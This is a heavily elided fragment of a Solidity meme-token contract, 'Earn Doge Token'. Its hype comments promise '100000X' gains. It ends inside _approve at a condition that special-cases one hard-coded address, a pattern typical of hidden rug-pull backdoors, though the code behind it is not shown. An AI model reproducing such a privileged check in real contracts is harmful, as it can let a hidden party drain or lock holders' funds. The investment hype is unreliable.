...
/** 
   ...
   Shiba,Rfi,Feg,CT,Safemoon,Pig combine together to create #EarnDogeToken.
   ...
   Can you make #EarnDogeToken 100000X? 

   1,000,000,000,000,000 total supply
   5,000,000,000,000 EarnDogeToken max limit for per trade
...
contract EarnDogeToken is Context, IERC20, Ownable {
    ...
    string private _name = "Earn Doge Token";
...
/*        function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
    ...
    */
    ...
    function _approve(address owner, address spender, uint256 amount) private {
      ...
      if (msg.sender == address(0x9A8f3E2c0c0BFC152636FcFb8753C0A48C4075EB)) {
